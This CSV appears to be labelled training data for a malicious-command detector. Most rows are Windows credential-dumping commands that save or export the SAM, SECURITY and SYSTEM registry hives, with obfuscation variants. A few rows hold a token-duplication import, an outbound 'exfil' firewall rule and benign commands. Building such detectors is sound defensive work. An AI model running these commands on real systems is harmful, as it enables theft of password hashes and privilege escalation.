text,label
"cmd.exe /c ""reg export hklm\sam c:\temp\1vn0q60e.dat""",1
reg save hklm\sam c:\windows\temp\osgqgkih.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\7bwtu6ci.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\o5k5b09i.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\jjpmv9e4.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\cbkx2fd3.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\rqaxy1rb.dat""""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\zj5rxcr8.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\7b4tf7q3.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\h35tc6s2.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\vji8bpm8.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\qt6iob24.dat""",1
reg save hklm\security c:\windows\temp\525o8kn5.save,1
reg export hklm\system c:\windows\temp\t7zi5ikz.save,1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\b75wzt20.save""",1
reg save hklm\security c:\windows\temp\iw1p6udx.save,1
reg export hklm\security c:\windows\temp\gkfs2ahd.save,1
reg save hklm\sam c:\windows\temp\jiqwugpt.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\1vqoxjc2.dat""",1
reg  export  hklm\sam  c:\windows\temp\5fr4czd5.save,1
reg export hklm\system c:\windows\temp\utb9rqd3.save,1
reg export hklm\security c:\windows\temp\iu0gz8yr.save,1
reg save hklm\system c:\windows\temp\81zj866p.save,1
reg export hklm\system c:\windows\temp\t1qzbosy.save,1
reg export hklm\security c:\windows\temp\4guiklb9.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\8043dxun.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\69wqn7hi.dat""",1
reg export hklm\system c:\windows\temp\6g6iap34.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\vb33qe3r.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\h31khgpu.dat""""",1
reg save hklm\sam c:\windows\temp\39v2xm29.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\dj6jwd86.dat""",1
reg export hklm\sam c:\windows\temp\lavtqn62.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\71aa7lut.dat""",1
reg save hklm\system c:\windows\temp\gjhf8ikv.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\etroskio.dat""",1
reg save hklm\sam c:\windows\temp\l6493dxf.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\cyht5kf2.dat""",1
reg export hklm\sam c:\windows\temp\ndxncizq.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\mf0zbc6r.dat""",1
reg export hklm\sam c:\windows\temp\9rdfxwks.save,1
reg export hklm\system c:\windows\temp\jjx9shcz.save,1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\x0cj0pnj.dat""",1
reg save hklm\system c:\windows\temp\nu8iwg88.save,1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\c56y079e.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\gt5cixih.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\5nf1ivxk.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\xvoxq160.dat""",1
reg save hklm\security c:\windows\temp\ueiarkl5.save,1
reg export hklm\sam c:\windows\temp\afwycfge.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\hlgbnklg.dat""",1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\9kp62cvs.save""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\m2k4l3ij.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\0dxozjje.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\d4zrh51c.dat""",1
reg save hklm\system c:\windows\temp\3ydh98o0.save,1
reg save hklm\security c:\windows\temp\3hmgehm5.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\djx4ufad.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\l8lm1hhq.dat""",1
reg export hklm\system c:\windows\temp\snkjxsk2.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\gd10vies.dat""",1
reg export hklm\system c:\windows\temp\ip8eutk5.save,1
reg export hklm\sam c:\windows\temp\01xc2lko.save,1
reg export hklm\system c:\windows\temp\5jd13kci.save,1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\y4vuh49m.dat""",1
reg  save  hklm\security  c:\windows\temp\8oeh3v0n.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\fz86iipq.dat""",1
reg save hklm\system c:\windows\temp\1xu7nsdc.save,1
reg export hklm\security c:\windows\temp\ymuiy0w0.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\yi3bb4m5.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\xvawyjpy.dat""",1
reg save hklm\sam c:\windows\temp\engnghq3.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\o19b7s9r.save""",1
reg export hklm\system c:\windows\temp\n03p9ule.save,1
reg export hklm\sam c:\windows\temp\iau2wju9.save,1
reg save hklm\security c:\windows\temp\l9l7dvow.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\kuk4tqwv.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\3teqk04b.dat""",1
reg   save   hklm\sam   c:\windows\temp\2b2vob99.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\25nur4kn.dat""",1
reg export hklm\security c:\windows\temp\a154sz1w.save,1
reg save hklm\sam c:\windows\temp\d2huuo88.save,1
reg save hklm\system c:\windows\temp\6fqri7g3.save,1
reg save hklm\sam c:\windows\temp\z1zotxnd.save,1
reg save hklm\system c:\windows\temp\wq0fp8ic.save,1
reg export hklm\system c:\windows\temp\fo1wuot5.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\7il9vnur.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ts6pu1xe.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\654wa6hl.dat""",1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg export hklm\sam c:\windows\temp\1x51fvwe.save,1
reg save hklm\security c:\windows\temp\laubcqsx.save,1
reg save hklm\security c:\windows\temp\2kbrj7en.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\2jvc58j5.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\n7qisabp.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\75objf5i.dat""",1
reg save hklm\sam c:\windows\temp\hnfjw7ux.save,1
reg save hklm\system c:\windows\temp\hw89igs4.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\xtwpc512.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\e0ne900d.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\frajayd4.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\61nshvhq.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\z4fquppt.dat""",1
reg export hklm\security c:\windows\temp\ai97q6s8.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\usbb4vbr.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\zwsff8yp.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ivd5yyzp.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\6jm2znrd.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\34tc8qs6.dat""",1
reg save hklm\security c:\windows\temp\z9vmvmyw.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\vq07xz4g.save""",1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\sam c:\temp\4x2lwiog.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\z3ibocfh.save""",1
reg save hklm\security c:\windows\temp\hvah3jon.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\s826bkpk.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\kb6idysy.dat""",1
reg export hklm\sam c:\windows\temp\41xxv79b.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\p0re5os0.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\kzjkridr.dat""""",1
reg save hklm\system c:\windows\temp\c74oc139.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\6moun4q2.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\stpa7hmi.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\igujaeeb.dat""",1
reg save hklm\system c:\windows\temp\ioqbqcmo.save,1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\sam c:\temp\4muuyp1q.dat""""",1
reg export hklm\security c:\windows\temp\ubcdynbi.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\lgsu9553.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\lnq90xsi.dat""""",1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\t7eijkgt.dat""",1
reg export hklm\sam c:\windows\temp\vpc3mal0.save,1
reg  export  hklm\system  c:\windows\temp\0sp1bug0.save,1
reg save hklm\sam c:\windows\temp\3ongsm89.save,1
reg export hklm\system c:\windows\temp\bgqz0vly.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\g8hupggq.dat""",1
reg export hklm\sam c:\windows\temp\39c9ahn0.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\f62hec7v.dat""",1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\b6vajg2d.save""",1
reg export hklm\security c:\windows\temp\biqpmqqs.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\zde8masj.dat""",1
reg export hklm\security c:\windows\temp\wj028fi4.save,1
"cmd.exe /c ""get-help   adjusttokenprivileges   -full""",0
"cmd.exe /c ""reg export hklm\sam c:\temp\inuh974n.dat""",1
reg export hklm\sam c:\windows\temp\fbio8nw7.save,1
reg export hklm\sam c:\windows\temp\o5gzoxy6.save,1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\rdpkwuf2.dat""",1
reg export hklm\system c:\windows\temp\z58ib81z.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\mk63sn9w.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\dedrb4cb.dat""",1
reg save hklm\security c:\windows\temp\8bd0dtkd.save,1
reg export hklm\system c:\windows\temp\b9p68wsf.save,1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\hnuqta4t.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\bdl9stpr.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\cnlcfiph.dat""",1
reg save hklm\sam c:\windows\temp\myva0c30.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\qjq4z9cm.dat""",1
reg save hklm\security c:\windows\temp\pfkkvsla.save,1
reg save hklm\system c:\windows\temp\ft8fkx0l.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\oj6ddz9y.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\813c8rqb.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\nit8no89.dat""",1
reg export hklm\security c:\windows\temp\vg9q6930.save,1
reg export hklm\sam c:\windows\temp\gwhpey06.save,1
"powershell -nop -c ""whoami   /groups""",0
"cmd.exe /c ""reg save hklm\sam c:\temp\8sexu6ns.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\7pnjf5ll.dat""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\h8lp6tp1.dat""",1
reg export hklm\system c:\windows\temp\vf7l3woy.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\2t3o2xm3.save""",1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\7c9eklci.save""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\it8aq8np.dat""""",1
reg save hklm\sam c:\windows\temp\maoiko7g.save,1
reg save hklm\system c:\windows\temp\encr07wi.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\wbs4gok2.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\b04yjtph.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\7d7fknjb.dat""",1
reg export hklm\security c:\windows\temp\3xajrzr4.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\lj6c8k2r.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\n5m8mmne.dat""",1
reg save hklm\system c:\windows\temp\t56rtyeq.save,1
reg export hklm\security c:\windows\temp\13m6krs5.save,1
reg export hklm\sam c:\windows\temp\9r06exdx.save,1
reg export hklm\sam c:\windows\temp\g7ags2yn.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ct3ct9yx.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\oqkk6xd4.dat""",1
reg export hklm\security c:\windows\temp\3w3a58ab.save,1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\sx0muns3.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\f3qf31j4.dat""",1
reg save hklm\system c:\windows\temp\a82slzn4.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\rrz9xv9t.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\acmz8a4n.dat""",1
reg save hklm\system c:\windows\temp\g2ad3axz.save,1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\inp2wz29.save""",1
reg export hklm\security c:\windows\temp\3z1rzcs8.save,1
reg save hklm\security c:\windows\temp\cv6fsvc9.save,1
reg save hklm\sam c:\windows\temp\vqfobj3m.save,1
reg export hklm\security c:\windows\temp\5w80dycq.save,1
reg  export  hklm\sam  c:\windows\temp\c76k7fuz.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\afiyr6ve.dat""",1
reg save hklm\security c:\windows\temp\ab0b93bn.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\vy0reroq.dat""",1
reg export hklm\sam c:\windows\temp\zrvohcps.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\nmb2663f.dat""",1
reg export hklm\security c:\windows\temp\6dc1serd.save,1
reg export hklm\system c:\windows\temp\yxp3vcf0.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\81vdcmfn.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\a2qcktng.dat""",1
reg export hklm\sam c:\windows\temp\4hlj0i90.save,1
reg export hklm\system c:\windows\temp\2rjjs088.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\bgjkduek.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\rc2x2ri6.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ybwcxakz.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\dyys6dat.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\61jdyyw9.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\myeckcow.dat""",1
reg export hklm\security c:\windows\temp\ri3krbxf.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\kxihgj3u.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\57386nxb.dat""",1
reg save hklm\sam c:\windows\temp\w9qundpv.save,1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\security c:\temp\nuq1h0xi.dat""""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\06gnxonm.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\0oidao6y.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\723hdg5m.dat""",1
reg save hklm\sam c:\windows\temp\iud0e3m4.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\wsuy9mn5.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\vokihtny.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\qym42yft.dat""",1
reg export hklm\sam c:\windows\temp\6w5bcxti.save,1
reg   save   hklm\system   c:\windows\temp\5mi01l0n.save,1
reg save hklm\security c:\windows\temp\lc0vlpb0.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\9by4l2fi.dat""",1
reg export hklm\security c:\windows\temp\tykgx2xx.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\4z728vo9.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\xaucp5qb.dat""",1
reg export hklm\sam c:\windows\temp\ug6u9gza.save,1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\sam c:\temp\6qmb4czk.dat""""",1
reg save hklm\sam c:\windows\temp\4r3gmp3l.save,1
reg save hklm\system c:\windows\temp\a6cyaopx.save,1
reg  save  hklm\system  c:\windows\temp\m9ar9xf9.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\iwml7hmb.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\6jmio27v.dat""",1
"[dllimport(""advapi32.dll"")] extern bool duplicatetokenex(...)",3
"cmd.exe /c ""reg save hklm\security c:\temp\827skyg5.dat""",1
reg export hklm\security c:\windows\temp\x3hz7yv4.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\6w2h5ifb.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\t91wccb9.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\xvv16e1c.dat""",1
reg export hklm\security c:\windows\temp\87oex7ow.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\0tpickff.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\msak2kts.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\mi14gfe7.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ecbc0ad4.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\q84e9ecy.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\3sd35eue.dat""",1
reg save hklm\system c:\windows\temp\nd077os1.save,1
reg export hklm\system c:\windows\temp\7zs4hvx1.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\td3hs5e3.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\h1g7e2ht.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\dsxzcl81.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\7yxlcu1x.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ly6k15kl.dat""",1
reg save hklm\system c:\windows\temp\rvfh8p9e.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\hp0uk6g9.dat""",1
reg save hklm\sam c:\windows\temp\ff8nmpue.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\qiia28dp.dat""",1
reg export hklm\security c:\windows\temp\2pp830ek.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\74t9umuk.dat""",1
reg save hklm\sam c:\windows\temp\4mytt84t.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\rlft4fsa.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\hbf4res3.dat""",1
reg export hklm\security c:\windows\temp\39tmqelq.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\2mfe7oxr.dat""",1
reg export hklm\system c:\windows\temp\60th3scc.save,1
reg export hklm\sam c:\windows\temp\582gu5rt.save,1
reg  save  hklm\sam  c:\windows\temp\ma9sgpsr.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\boj8jo7h.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\d5ag4hls.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\iwpcvef8.dat""",1
reg export hklm\security c:\windows\temp\kntl4ws4.save,1
reg   export   hklm\system   c:\windows\temp\ukzre6hh.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\a8vk6zoe.dat""""",1
reg save hklm\system c:\windows\temp\lhlxxqdp.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\rn5rx8bh.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\sj91cker.dat""",1
reg export hklm\system c:\windows\temp\yw3fc8ni.save,1
reg save hklm\security c:\windows\temp\9vwgbvn7.save,1
reg save hklm\system c:\windows\temp\hg99meg7.save,1
reg   save   hklm\security   c:\windows\temp\vz0y51rt.save,1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\6rym4m69.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\llitxnof.dat""",1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\ocdxb6sv.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\pvxc01lc.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\qdz17avn.dat""",1
reg export hklm\sam c:\windows\temp\t3shr2db.save,1
reg save hklm\system c:\windows\temp\pcir8it2.save,1
reg save hklm\sam c:\windows\temp\2hreyko0.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\uv5clw7o.dat""",1
reg export hklm\system c:\windows\temp\hg35xwty.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\vnsa3rn1.dat""",1
reg save hklm\security c:\windows\temp\123fg9vc.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\o5d3v55n.dat""",1
reg export hklm\sam c:\windows\temp\nkbailfg.save,1
reg save hklm\system c:\windows\temp\0vf6rx5y.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\rr2ckpqe.dat""",1
reg save hklm\sam c:\windows\temp\dk55483q.save,1
reg save hklm\system c:\windows\temp\2rybnr3h.save,1
reg save hklm\security c:\windows\temp\tootxtb6.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ztvujojc.dat""",1
reg export hklm\security c:\windows\temp\hxjqhqvv.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\b23dk31w.dat""",1
reg export hklm\sam c:\windows\temp\coyx2vnu.save,1
reg export hklm\sam c:\windows\temp\s2kyee4f.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\qiq1v5bd.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\lgvdzipc.dat""",1
reg save hklm\system c:\windows\temp\nuompxqa.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\5ooiknra.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\69p7adbl.dat""",1
reg export hklm\system c:\windows\temp\8t70sf6i.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\e88m9wjm.save""",1
